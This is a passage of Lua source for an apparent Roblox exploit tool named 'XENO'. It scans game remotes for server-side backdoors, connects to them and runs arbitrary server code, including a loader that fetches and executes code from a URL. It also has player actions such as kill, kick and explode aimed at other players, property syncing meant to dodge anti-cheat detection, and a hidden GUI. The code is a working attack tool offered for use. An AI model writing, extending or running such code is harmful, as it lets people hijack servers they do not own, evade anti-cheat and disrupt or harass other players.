            -- Cleanup remaining markers
            for _, t in ipairs(markers) do
                local leftover = RS:FindFirstChild(t)
                if leftover then pcall(function() leftover:Destroy() end) end
            end
            return true, idx, pats[idx].name
        end
    end

    -- Cleanup any markers
    for _, tag in ipairs(markers) do
        local leftover = RS:FindFirstChild(tag)
        if leftover then pcall(function() leftover:Destroy() end) end
    end

    self.tested[remote] = true
    return false, nil, nil
end

function BD:validate(remote) return self:validateThrottled(remote) end

function BD:scan(statusCallback, quickMode)
    if self.scanning then return self.confirmed end
    self.scanning = true; self.confirmed = {}
    local startTime = U.clock()

    if statusCallback then statusCallback("gathering", 0) end

    local remotes, p1, p2, p3, p4 = self:gatherRemotes()

    if quickMode then
        local quick = {}
        for i = 1, p1 + p2 do if remotes[i] then quick[#quick+1] = remotes[i] end end
        remotes = quick
    end

    local totalRemotes = #remotes
    local modeStr = quickMode and "QUICK" or "DEEP"

    if statusCallback then
        statusCallback("gathered", totalRemotes, 0, nil, {exact=p1, pattern=p2, short=p3, other=p4, mode=modeStr})
    end

    local scannedCount = 0
    local i = 1

    while i <= totalRemotes do
        local batch = {}
        for j = 1, CFG.ConcurrentMax do
            local idx = i + j - 1
            if idx > totalRemotes then break end
            if not self.tested[remotes[idx]] then
                batch[#batch+1] = {remote = remotes[idx], index = idx}
            end
        end

        if #batch == 0 then i = i + CFG.ConcurrentMax; continue end

        -- Test each remote in batch sequentially with throttled fires
        -- (sequential within batch to avoid rate limit)
        for _, item in ipairs(batch) do
            local remote = item.remote

            if statusCallback then
                local elapsed = U.clock() - startTime
                statusCallback("validating", totalRemotes, scannedCount, remote.Name, {
                    elapsed = elapsed,
                    confirmed = #self.confirmed,
                    perSecond = scannedCount / math.max(elapsed, 0.01),
                })
            end

            local valid, patIdx, patName = self:validateThrottled(remote)

            if valid then
                local fpName = self:fingerprint(remote, patName)
                local entry = {
                    inst = remote, name = remote.Name, path = remote:GetFullName(),
                    type = remote.ClassName, patternIdx = patIdx,
                    patternName = patName, fingerprint = fpName,
                }
                self.confirmed[#self.confirmed+1] = entry
                if statusCallback then statusCallback("found", totalRemotes, scannedCount, remote.Name, entry) end
            end

            self.tested[remote] = true
            scannedCount = scannedCount + 1

            -- Cooldown between remotes
            U.jitterWait(CFG.ScanCooldown, 0.05)
        end

        i = i + CFG.ConcurrentMax
    end

    local totalTime = U.clock() - startTime
    self.scanStats = {remotesScanned = scannedCount, timeElapsed = totalTime, patternsTotal = scannedCount * #self.patterns}
    self.scanning = false
    if statusCallback then statusCallback("done", #self.confirmed, scannedCount, nil, self.scanStats) end
    return self.confirmed
end

function BD:connect(e) self.active = e end
function BD:disconnect() self.active = nil end
function BD:isConnected() return self.active ~= nil end

function BD:exec(code)
    if not self.active then return false, "No backdoor connected" end
    local pats = self.active.inst:IsA("RemoteFunction") and self.rfPatterns or self.patterns
    local pat = pats[self.active.patternIdx]
    if not pat then return false, "Invalid pattern" end
    local ok, err = pcall(function() pat.fn(self.active.inst, code) end)
    return ok, err
end

function BD:requireModule(id)
    return self:exec(string.format('pcall(function() local m=require(%d);if type(m)=="function" then m() elseif type(m)=="table" then if m.init then m.init() elseif m.Init then m.Init() elseif m.Start then m.Start() elseif m.Run then m.Run() elseif m.Execute then m.Execute() end end end)', tonumber(id) or 0))
end

function BD:loadUrl(url)
    return self:exec(string.format('loadstring(game:GetService("HttpService"):GetAsync("%s"))()', tostring(url)))
end

function BD:resetScanned() self.tested = {}; self.confirmed = {}; self.scanStats = {remotesScanned=0,timeElapsed=0,patternsTotal=0} end

-- ═══════════════════════════════════════════════════
--  6 · NOTIFICATION SYSTEM
-- ═══════════════════════════════════════════════════

local Notify

local gui = Instance.new("ScreenGui")
gui.Name = "XenoFramework_" .. U.uid()
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true; gui.DisplayOrder = 999

pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
pcall(function() if gethui then gui.Parent = gethui(); return end end)
local guiOk = pcall(function() gui.Parent = CoreGui end)
if not guiOk then gui.Parent = LP:WaitForChild("PlayerGui") end

local T = CFG.Theme

local toastHolder = U.new("Frame", {
    Name="Toasts", Size=UDim2.new(0,300,1,0), Position=UDim2.new(1,-310,0,0),
    BackgroundTransparency=1, Parent=gui,
}, {
    U.new("UIListLayout", {Padding=UDim.new(0,6), VerticalAlignment=Enum.VerticalAlignment.Bottom, HorizontalAlignment=Enum.HorizontalAlignment.Center, SortOrder=Enum.SortOrder.LayoutOrder}),
    U.new("UIPadding", {PaddingBottom=UDim.new(0,18)}),
})

Notify = function(text, color, duration)
    color = color or T.Text; duration = duration or CFG.ToastLife
    local toast = U.new("Frame", {Size=UDim2.new(1,0,0,36), BackgroundColor3=T.Surface, BackgroundTransparency=1, BorderSizePixel=0, ClipsDescendants=true, Parent=toastHolder}, {
        U.new("UICorner", {CornerRadius=UDim.new(0,8)}),
        U.new("UIStroke", {Color=color, Thickness=1, Transparency=0.55}),
        U.new("Frame", {Size=UDim2.new(0,3,1,0), BackgroundColor3=color, BorderSizePixel=0}),
        U.new("TextLabel", {Size=UDim2.new(1,-16,1,0), Position=UDim2.new(0,14,0,0), BackgroundTransparency=1, Text=text, TextColor3=T.Text, TextSize=13, Font=Enum.Font.Gotham, TextXAlignment=Enum.TextXAlignment.Left, TextTruncate=Enum.TextTruncate.AtEnd}),
    })
    U.tween(toast, {BackgroundTransparency=0.12}, 0.3)
    task.delay(duration, function()
        U.tween(toast, {BackgroundTransparency=1, Size=UDim2.new(1,0,0,0)}, 0.35)
        task.wait(0.38); pcall(function() toast:Destroy() end)
    end)
end

-- ═══════════════════════════════════════════════════
--  7 · MAIN WINDOW
-- ═══════════════════════════════════════════════════

local W = CFG.Window
local main = U.new("Frame", {
    Name="Main", Size=UDim2.new(0,W.Width,0,W.Height), Position=UDim2.new(0.5,0,0.5,0),
    AnchorPoint=Vector2.new(0.5,0.5), BackgroundColor3=T.BG, BorderSizePixel=0, ClipsDescendants=true, Parent=gui,
}, {U.new("UICorner", {CornerRadius=UDim.new(0,12)}), U.new("UIStroke", {Color=T.Border, Thickness=1, Transparency=0.3})})

U.new("ImageLabel", {Name="Shadow", Size=UDim2.new(1,44,1,44), Position=UDim2.new(0.5,0,0.5,0), AnchorPoint=Vector2.new(0.5,0.5), BackgroundTransparency=1, Image="rbxassetid://6015897843", ImageColor3=Color3.new(0,0,0), ImageTransparency=0.5, ScaleType=Enum.ScaleType.Slice, SliceCenter=Rect.new(49,49,450,450), ZIndex=-1, Parent=main})

local topBar = U.new("Frame", {Name="TopBar", Size=UDim2.new(1,0,0,40), BackgroundColor3=T.Surface, BorderSizePixel=0, Parent=main}, {
    U.new("UICorner", {CornerRadius=UDim.new(0,12)}),
    U.new("Frame", {Size=UDim2.new(1,0,0,14), Position=UDim2.new(0,0,1,-14), BackgroundColor3=T.Surface, BorderSizePixel=0}),
})

U.new("TextLabel", {Size=UDim2.new(0,200,1,0), Position=UDim2.new(0,16,0,0), BackgroundTransparency=1, Text="⚡ XENO", TextColor3=T.Primary, TextSize=16, Font=Enum.Font.GothamBold, TextXAlignment=Enum.TextXAlignment.Left, Parent=topBar})
U.new("TextLabel", {Size=UDim2.new(0,60,1,0), Position=UDim2.new(0,86,0,0), BackgroundTransparency=1, Text="v"..CFG.Version, TextColor3=T.Sub, TextSize=11, Font=Enum.Font.Gotham, TextXAlignment=Enum.TextXAlignment.Left, Parent=topBar})

local statusDot = U.new("Frame", {Size=UDim2.new(0,8,0,8), Position=UDim2.new(0,150,0.5,0), AnchorPoint=Vector2.new(0,0.5), BackgroundColor3=T.Sub, BorderSizePixel=0, Parent=topBar}, {U.new("UICorner",{CornerRadius=UDim.new(1,0)})})
local statusLabel = U.new("TextLabel", {Size=UDim2.new(0,160,1,0), Position=UDim2.new(0,164,0,0), BackgroundTransparency=1, Text="Starting...", TextColor3=T.Sub, TextSize=11, Font=Enum.Font.Gotham, TextXAlignment=Enum.TextXAlignment.Left, TextTruncate=Enum.TextTruncate.AtEnd, Parent=topBar})
local function setStatus(t, c) statusLabel.Text = t; U.tween(statusDot, {BackgroundColor3=c}, 0.3) end

local controlsLayout = U.new("Frame", {Size=UDim2.new(0,74,0,32), Position=UDim2.new(1,-82,0.5,0), AnchorPoint=Vector2.new(0,0.5), BackgroundTransparency=1, Parent=topBar}, {U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),VerticalAlignment=Enum.VerticalAlignment.Center,SortOrder=Enum.SortOrder.LayoutOrder})})

local function windowBtn(icon,order,cb)
    local btn = U.new("TextButton",{Size=UDim2.new(0,32,0,32),BackgroundColor3=T.Card,BackgroundTransparency=0.6,BorderSizePixel=0,Text=icon,TextColor3=T.Sub,TextSize=16,Font=Enum.Font.GothamBold,AutoButtonColor=false,LayoutOrder=order,Parent=controlsLayout},{U.new("UICorner",{CornerRadius=UDim.new(0,8)})})
    btn.MouseEnter:Connect(function() U.tween(btn,{BackgroundTransparency=0.2,TextColor3=T.Text},0.18) end)
    btn.MouseLeave:Connect(function() U.tween(btn,{BackgroundTransparency=0.6,TextColor3=T.Sub},0.18) end)
    btn.MouseButton1Click:Connect(cb); return btn
end

local minimized = false
windowBtn("—",1,function() minimized = not minimized; U.tween(main,{Size=UDim2.new(0,W.Width,0,minimized and 40 or W.Height)},0.35) end)
windowBtn("✕",2,function() U.tween(main,{Size=UDim2.new(0,0,0,0)},0.4,Enum.EasingStyle.Back,Enum.EasingDirection.In); task.wait(0.42); gui:Destroy() end)

do
    local dragging,dragStart,startPos
    topBar.InputBegan:Connect(function(input) if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then dragging=true;dragStart=input.Position;startPos=main.Position;input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging=false end end) end end)
    UIS.InputChanged:Connect(function(input) if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then local d=input.Position-dragStart; main.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y) end end)
end

-- ═══════════════════════════════════════════════════
--  8 · SIDEBAR + PAGES
-- ═══════════════════════════════════════════════════

local sidebar = U.new("Frame",{Name="Sidebar",Size=UDim2.new(0,150,1,-40),Position=UDim2.new(0,0,0,40),BackgroundColor3=T.Surface,BorderSizePixel=0,Parent=main},{
    U.new("UIPadding",{PaddingTop=UDim.new(0,10),PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)}),
    U.new("UIListLayout",{Padding=UDim.new(0,4),SortOrder=Enum.SortOrder.LayoutOrder}),
})

local pageContainer = U.new("Frame",{Name="Pages",Size=UDim2.new(1,-150,1,-40),Position=UDim2.new(0,150,0,40),BackgroundColor3=T.BG,BorderSizePixel=0,ClipsDescendants=true,Parent=main})
local pages,currentTab,tabButtons = {},nil,{}

local function makePage(name)
    local page = U.new("ScrollingFrame",{Name=name,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,BorderSizePixel=0,ScrollBarThickness=3,ScrollBarImageColor3=T.Primary,CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,Visible=false,Parent=pageContainer},{
        U.new("UIListLayout",{Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder,HorizontalAlignment=Enum.HorizontalAlignment.Center}),
        U.new("UIPadding",{PaddingTop=UDim.new(0,14),PaddingBottom=UDim.new(0,14),PaddingLeft=UDim.new(0,14),PaddingRight=UDim.new(0,14)}),
    })
    pages[name]=page; return page
end

local function switchTab(name)
    if currentTab==name then return end
    for n,p in pairs(pages) do p.Visible=(n==name) end
    for n,btn in pairs(tabButtons) do
        if n==name then U.tween(btn,{BackgroundColor3=T.Primary,BackgroundTransparency=0.15,TextColor3=T.Text},0.22)
        else U.tween(btn,{BackgroundColor3=T.Card,BackgroundTransparency=0.7,TextColor3=T.Sub},0.22) end
    end
    currentTab=name
end

-- ★ Added Anti-Cheat tab
for _,td in ipairs({
    {name="Dashboard",icon="⌂",order=1},{name="Players",icon="♟",order=2},
    {name="Commands",icon="›_",order=3},{name="Scripts",icon="{ }",order=4},
    {name="Server",icon="⚙",order=5},{name="Anti-Cheat",icon="🛡️",order=6},
}) do
    makePage(td.name)
    local btn = U.new("TextButton",{Size=UDim2.new(1,0,0,34),BackgroundColor3=T.Card,BackgroundTransparency=0.7,BorderSizePixel=0,Text="  "..td.icon.."   "..td.name,TextColor3=T.Sub,TextSize=13,Font=Enum.Font.GothamSemibold,TextXAlignment=Enum.TextXAlignment.Left,AutoButtonColor=false,LayoutOrder=td.order,Parent=sidebar},{U.new("UICorner",{CornerRadius=UDim.new(0,8)})})
    btn.MouseEnter:Connect(function() if currentTab~=td.name then U.tween(btn,{BackgroundTransparency=0.4},0.15) end end)
    btn.MouseLeave:Connect(function() if currentTab~=td.name then U.tween(btn,{BackgroundTransparency=0.7},0.15) end end)
    btn.MouseButton1Click:Connect(function() switchTab(td.name) end)
    tabButtons[td.name]=btn
end

-- ═══════════════════════════════════════════════════
--  9 · UI HELPERS
-- ═══════════════════════════════════════════════════

local function card(parent,height,order)
    return U.new("Frame",{Size=UDim2.new(1,0,0,height or 90),BackgroundColor3=T.Card,BorderSizePixel=0,LayoutOrder=order or 0,Parent=parent},{
        U.new("UICorner",{CornerRadius=UDim.new(0,10)}),U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.5}),
        U.new("UIPadding",{PaddingTop=UDim.new(0,10),PaddingBottom=UDim.new(0,10),PaddingLeft=UDim.new(0,12),PaddingRight=UDim.new(0,12)}),
    })
end

local function heading(parent,text,order)
    return U.new("TextLabel",{Size=UDim2.new(1,0,0,22),BackgroundTransparency=1,Text=text,TextColor3=T.Text,TextSize=15,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,LayoutOrder=order or 0,Parent=parent})
end

local function actionBtn(parent,text,color,order,cb)
    color=color or T.Primary
    local btn = U.new("TextButton",{Size=UDim2.new(0,110,0,30),BackgroundColor3=color,BackgroundTransparency=0.15,BorderSizePixel=0,Text=text,TextColor3=T.Text,TextSize=12,Font=Enum.Font.GothamSemibold,AutoButtonColor=false,LayoutOrder=order or 0,Parent=parent},{U.new("UICorner",{CornerRadius=UDim.new(0,7)})})
    btn.MouseEnter:Connect(function() U.tween(btn,{BackgroundTransparency=0},0.15) end)
    btn.MouseLeave:Connect(function() U.tween(btn,{BackgroundTransparency=0.15},0.15) end)
    if cb then btn.MouseButton1Click:Connect(cb) end; return btn
end

local function inputField(parent,ph,order)
    local box = U.new("TextBox",{Size=UDim2.new(1,0,0,32),BackgroundColor3=T.Surface,BorderSizePixel=0,Text="",PlaceholderText=ph or "Type here...",PlaceholderColor3=T.Sub,TextColor3=T.Text,TextSize=13,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,ClearTextOnFocus=false,LayoutOrder=order or 0,Parent=parent},{
        U.new("UICorner",{CornerRadius=UDim.new(0,7)}),U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.4}),
        U.new("UIPadding",{PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10)}),
    })
    box.Focused:Connect(function() local s=box:FindFirstChildWhichIsA("UIStroke"); if s then U.tween(s,{Color=T.Primary,Transparency=0},0.2) end end)
    box.FocusLost:Connect(function() local s=box:FindFirstChildWhichIsA("UIStroke"); if s then U.tween(s,{Color=T.Border,Transparency=0.4},0.2) end end)
    return box
end

-- ═══════════════════════════════════════════════════
--  10 · DASHBOARD PAGE
-- ═══════════════════════════════════════════════════

local playerCountLbl, backdoorCountLbl, statusValLbl, scanResultsLabel

do
    local pg = pages.Dashboard
    heading(pg,"Dashboard",1)

    local infoRow = U.new("Frame",{Size=UDim2.new(1,0,0,60),BackgroundTransparency=1,LayoutOrder=2,Parent=pg},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8),SortOrder=Enum.SortOrder.LayoutOrder})})
    local function infoCard(label,init,col,order)
        local c=U.new("Frame",{Size=UDim2.new(0.32,-4,1,0),BackgroundColor3=T.Card,BorderSizePixel=0,LayoutOrder=order,Parent=infoRow},{U.new("UICorner",{CornerRadius=UDim.new(0,8)}),U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.6})})
        U.new("TextLabel",{Size=UDim2.new(1,-16,0,16),Position=UDim2.new(0,8,0,8),BackgroundTransparency=1,Text=label,TextColor3=T.Sub,TextSize=10,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=c})
        return U.new("TextLabel",{Name="Value",Size=UDim2.new(1,-16,0,22),Position=UDim2.new(0,8,0,28),BackgroundTransparency=1,Text=init,TextColor3=col or T.Text,TextSize=17,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=c})
    end

    playerCountLbl = infoCard("PLAYERS",tostring(#Players:GetPlayers()),T.Accent,1)
    backdoorCountLbl = infoCard("CONFIRMED","—",T.Warn,2)
    statusValLbl = infoCard("STATUS","Ready",T.Sub,3)

    Players.PlayerAdded:Connect(function() playerCountLbl.Text=tostring(#Players:GetPlayers()) end)
    Players.PlayerRemoving:Connect(function() task.wait(0.1); playerCountLbl.Text=tostring(#Players:GetPlayers()) end)

    heading(pg,"Backdoor Scanner (Throttled)",3)
    local scanCard = card(pg,180,4)

    scanResultsLabel = U.new("TextLabel",{Name="ScanResults",Size=UDim2.new(1,0,0,105),BackgroundTransparency=1,
        Text=string.format('<font color="#9399B2">Throttled engine ready.\n%d patterns · %d signatures · %d fingerprints\nSafe fire rate: %.0fms±%.0fms between fires\n\nQuick Scan = priority remotes only\nDeep Scan = all remotes (now safe, no kicks)</font>',
            #BD.patterns,#BD.exactNames,#BD.fingerprints,CFG.FireDelay*1000,CFG.FireJitter*1000),
        TextColor3=T.Sub,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=scanCard})

    local scanBtns = U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=scanCard},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,6),SortOrder=Enum.SortOrder.LayoutOrder})})
    local scanRunning = false

    local function runScan(quickMode)
        if scanRunning then return end; scanRunning = true
        BD:resetScanned(); setStatus("Scanning...",T.Warn)
        statusValLbl.Text="Scanning..."; statusValLbl.TextColor3=T.Warn; backdoorCountLbl.Text="..."
        local modeStr = quickMode and "QUICK" or "DEEP"
        scanResultsLabel.Text='<font color="#F9E2AF">['..modeStr..'] Gathering...</font>'

        task.spawn(function()
            local confirmed = BD:scan(function(phase,total,current,name,extra)
                if phase=="gathering" then
                    scanResultsLabel.Text='<font color="#F9E2AF">['..modeStr..'] Scanning services...</font>'
                elseif phase=="gathered" then
                    local i=extra
                    scanResultsLabel.Text=string.format('<font color="#F9E2AF">[%s] %d remotes to validate</font>\n<font color="#A6E3A1">▸ %d exact · %d pattern</font> <font color="#9399B2">· %d short · %d other</font>\n<font color="#9399B2">Throttled: %dms±%dms per fire</font>',i.mode,total,i.exact,i.pattern,i.short,i.other,CFG.FireDelay*1000,CFG.FireJitter*1000)
                    task.wait(0.8)
                elseif phase=="validating" then
                    local i=extra
                    scanResultsLabel.Text=string.format('<font color="#F9E2AF">[%s] %d/%d</font> <font color="#CDD6F4">— %s</font>\n<font color="#9399B2">%.1fs · %.1f/s</font>\n<font color="#A6E3A1">Confirmed: %d</font>',modeStr,current,total,tostring(name),i.elapsed,i.perSecond,i.confirmed)
                    setStatus(current.."/"..total.." ("..string.format("%.1fs",i.elapsed)..")",T.Warn)
                elseif phase=="found" then
                    Notify("✓ "..extra.name.." ["..extra.fingerprint.."]",T.OK,5)
                end
            end, quickMode)

            local stats=BD.scanStats; backdoorCountLbl.Text=tostring(#confirmed)

            if #confirmed==0 then
                scanResultsLabel.Text=string.format('<font color="#F3788C">No backdoors found.</font>\n\n<font color="#9399B2">Scanned %d remotes in %.2fs (%.0f/s)\nTested %d pattern combos safely\n\nTry a different game or require a module</font>',stats.remotesScanned,stats.timeElapsed,stats.remotesScanned/math.max(stats.timeElapsed,0.01),stats.patternsTotal)
                setStatus("Clean ("..string.format("%.1fs",stats.timeElapsed)..")",T.Err)
                statusValLbl.Text="Clean"; statusValLbl.TextColor3=T.Err
            else
                local lines = {string.format('<font color="#A6E3A1">✓ %d backdoor(s) in %.2fs</font>',#confirmed,stats.timeElapsed)}
                for i,e in ipairs(confirmed) do
                    lines[#lines+1]=string.format('<font color="#A6E3A1">✓ %s</font> <font color="#F9E2AF">[%s]</font> <font color="#9399B2">%s</font>',e.name,e.fingerprint,e.patternName)
                    if i>=3 and #confirmed>3 then lines[#lines+1]=string.format('<font color="#9399B2">+%d more</font>',#confirmed-3); break end
                end
                scanResultsLabel.Text=table.concat(lines,"\n")
                BD:connect(confirmed[1])
                setStatus(confirmed[1].name.." ["..confirmed[1].fingerprint.."]",T.OK)
                statusValLbl.Text="Connected"; statusValLbl.TextColor3=T.OK
                Notify("✓ "..confirmed[1].name.." ["..confirmed[1].fingerprint.."] in "..string.format("%.1fs",stats.timeElapsed),T.OK,6)
            end
            scanRunning=false
        end)
    end

    actionBtn(scanBtns,"⚡ Quick",T.Primary,1,function() runScan(true) end)
    actionBtn(scanBtns,"🔍 Deep",T.Accent,2,function() runScan(false) end)
    actionBtn(scanBtns,"⚡ Con#1",T.OK,3,function()
        if #BD.confirmed==0 then Notify("Scan first",T.Err); return end
        BD:connect(BD.confirmed[1]); setStatus(BD.confirmed[1].name.." ["..BD.confirmed[1].fingerprint.."]",T.OK)
        statusValLbl.Text="Connected"; statusValLbl.TextColor3=T.OK; Notify("✓ Connected",T.OK)
    end)
    actionBtn(scanBtns,"⛔ DC",T.Err,4,function() BD:disconnect(); setStatus("Disconnected",T.Err); statusValLbl.Text="DC"; statusValLbl.TextColor3=T.Err end)

    heading(pg,"Manual Connect",5)
    local mc = card(pg,80,6)
    U.new("TextLabel",{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Text="Remote path:",TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=mc})
    local mi = inputField(mc,"e.g. ReplicatedStorage.RemoteEvent",2)
    mi.Size=UDim2.new(0.72,0,0,30); mi.Position=UDim2.new(0,0,1,-32)
    local mb = actionBtn(mc,"Validate",T.Accent,3,function()
        local path=mi.Text; if path=="" then Notify("Enter path",T.Err); return end
        local obj=nil; pcall(function() obj=game; for part in path:gmatch("[^%.]+") do if part~="game" then obj=obj:FindFirstChild(part) end end end)
        if not obj or (not obj:IsA("RemoteEvent") and not obj:IsA("RemoteFunction")) then Notify("Not found",T.Err); return end
        Notify("Validating...",T.Warn); setStatus("Validating...",T.Warn)
        task.spawn(function()
            local valid,patIdx,patName = BD:validateThrottled(obj)
            if valid then
                local fp=BD:fingerprint(obj,patName)
                local entry={inst=obj,name=obj.Name,path=obj:GetFullName(),type=obj.ClassName,patternIdx=patIdx,patternName=patName,fingerprint=fp}
                BD:connect(entry); BD.confirmed[#BD.confirmed+1]=entry; backdoorCountLbl.Text=tostring(#BD.confirmed)
                setStatus(obj.Name.." ["..fp.."]",T.OK); statusValLbl.Text="Connected"; statusValLbl.TextColor3=T.OK
                Notify("✓ "..obj.Name.." ["..fp.."]",T.OK)
            else setStatus("Failed",T.Err); Notify("✗ Not a backdoor",T.Err) end
        end)
    end)
    mb.Position=UDim2.new(0.74,4,1,-32)
end

-- ═══════════════════════════════════════════════════
--  11 · PLAYERS PAGE
-- ═══════════════════════════════════════════════════

do
    local pg=pages.Players
    heading(pg,"Player Management",1)
    local targetInput = inputField(pg,"Player (me/all/others/name)...",2)
    heading(pg,"Quick Actions",3)
    local ag = U.new("Frame",{Size=UDim2.new(1,0,0,220),BackgroundTransparency=1,LayoutOrder=4,Parent=pg},{U.new("UIGridLayout",{CellSize=UDim2.new(0,120,0,32),CellPadding=UDim2.new(0,6,0,6),SortOrder=Enum.SortOrder.LayoutOrder})})

    for i,act in ipairs({
        {"💀 Kill","kill",T.Err},{"🚪 Kick","kick",T.Err},{"🛡️ God","god",T.OK},
        {"❄️ Freeze","freeze",T.Accent},{"🔥 Thaw","thaw",T.Warn},{"👻 Invis","invisible",T.Sub},
        {"👁️ Visible","visible",T.Text},{"💥 Explode","explode",T.Err},{"🔥 Fire","fire",T.Warn},
        {"✨ Sparkles","sparkles",T.Accent},{"🪑 Sit","sit",T.Sub},{"⬆️ Jump","jump",T.OK},
        {"🏃 Speed 100","speed",T.Primary},{"🦘 JPwr 100","jpower",T.Primary},
        {"🛡️ FF","ff",T.OK},{"🚫 UnFF","unff",T.Err},
    }) do
        actionBtn(ag,act[1],act[3],i,function()
            if not BD:isConnected() then Notify("Not connected!",T.Err); return end
            local q=targetInput.Text~="" and targetInput.Text or "me"
            local targets=U.findPlayers(q); if #targets==0 then Notify("No player: "..q,T.Err); return end
            for _,plr in ipairs(targets) do
                local pn=string.format('game.Players["%s"]',plr.Name)
                local ch,hr,hm=pn..".Character",pn..".Character:FindFirstChild('HumanoidRootPart')",pn..'.Character:FindFirstChildWhichIsA("Humanoid")'
                local code=""
                local cmd=act[2]
                if cmd=="kill" then code="pcall(function() "..ch..":BreakJoints() end)"
                elseif cmd=="kick" then code=pn..':Kick("XENO")'
                elseif cmd=="god" then code="pcall(function() local h="..hm..";h.MaxHealth=math.huge;h.Health=math.huge end)"
                elseif cmd=="freeze" then code="pcall(function() "..hr..".Anchored=true end)"
                elseif cmd=="thaw" then code="pcall(function() "..hr..".Anchored=false end)"
                elseif cmd=="invisible" then code="pcall(function() for _,v in pairs("..ch..":GetDescendants()) do if v:IsA('BasePart') then v.Transparency=1 end if v:IsA('Decal') then v.Transparency=1 end end end)"
                elseif cmd=="visible" then code="pcall(function() for _,v in pairs("..ch..":GetDescendants()) do if v:IsA('BasePart') and v.Name~='HumanoidRootPart' then v.Transparency=0 end if v:IsA('Decal') then v.Transparency=0 end end end)"
                elseif cmd=="explode" then code="pcall(function() local e=Instance.new('Explosion',workspace);e.Position="..hr..".Position end)"
                elseif cmd=="fire" then code="pcall(function() Instance.new('Fire',"..hr..") end)"
                elseif cmd=="sparkles" then code="pcall(function() Instance.new('Sparkles',"..hr..") end)"
                elseif cmd=="sit" then code="pcall(function() "..hm..".Sit=true end)"
                elseif cmd=="jump" then code="pcall(function() "..hm..".Jump=true end)"
                elseif cmd=="speed" then code="pcall(function() "..hm..".WalkSpeed=100 end)"
                elseif cmd=="jpower" then code="pcall(function() local h="..hm..";h.UseJumpPower=true;h.JumpPower=100 end)"
                elseif cmd=="ff" then code="pcall(function() Instance.new('ForceField',"..ch..") end)"
                elseif cmd=="unff" then code="pcall(function() for _,v in pairs("..ch..":GetChildren()) do if v:IsA('ForceField') then v:Destroy() end end end)"
                end
                local ok=BD:exec(code)
                -- Sync properties after stat changes to avoid AC detection
                if AC.active and (cmd=="speed" or cmd=="jpower" or cmd=="god") then
                    task.delay(0.3, function() AC:syncProperties(BD) end)
                end
                if ok then Notify(act[1].." → "..plr.Name,T.OK) else Notify("Error",T.Err) end
            end
        end)
    end
end

-- ═══════════════════════════════════════════════════
--  12 · COMMANDS PAGE
-- ═══════════════════════════════════════════════════

local cmdHistory,addHistory,cmdInput = {},nil,nil

do
    local pg=pages.Commands
    heading(pg,"Command Console",1)
    cmdInput = inputField(pg,CFG.Prefix.."command [args...]",2)
    local hc = card(pg,230,3)
    local hl = U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text='<font color="#9399B2">History appears here...</font>',TextColor3=T.Sub,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=hc})

    addHistory = function(entry,color)
        table.insert(cmdHistory,1,{text=entry,color=color or "#CDD6F4"})
        if #cmdHistory>CFG.MaxHistory then table.remove(cmdHistory) end
        local lines={}
        for i=1,math.min(#cmdHistory,24) do lines[#lines+1]=string.format('<font color="%s">%s</font>',cmdHistory[i].color,cmdHistory[i].text) end
        hl.Text=table.concat(lines,"\n")
    end

    heading(pg,"Reference",4)
    local rc=card(pg,180,5)
    U.new("TextLabel",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text=table.concat({
        '<font color="#8A2BE2">Player:</font> ;kill ;kick ;god ;freeze ;thaw ;tp ;speed ;jp',
        '  ;ff ;unff ;explode ;sit ;invisible ;visible ;fire ;sparkles ;smoke','',
        '<font color="#8A2BE2">Server:</font> ;time ;fog ;gravity ;music ;stopmusic',
        '  ;message ;hint ;shutdown ;lock ;unlock','',
        '<font color="#8A2BE2">AC Bypass:</font> ;bypass ;acstatus ;syncprops','',
        '<font color="#8A2BE2">Utility:</font> ;require ;loadurl ;exec ;cmds ;clear ;status ;scanstats',
    },"\n"),TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,TextWrapped=true,RichText=true,Parent=rc})
end

-- ═══════════════════════════════════════════════════
--  13 · SCRIPTS PAGE
-- ═══════════════════════════════════════════════════

do
    local pg=pages.Scripts
    heading(pg,"Require Loader",1)
    local rc=card(pg,80,2); local ri=inputField(rc,"Module Asset ID...",1); ri.Size=UDim2.new(1,0,0,30)
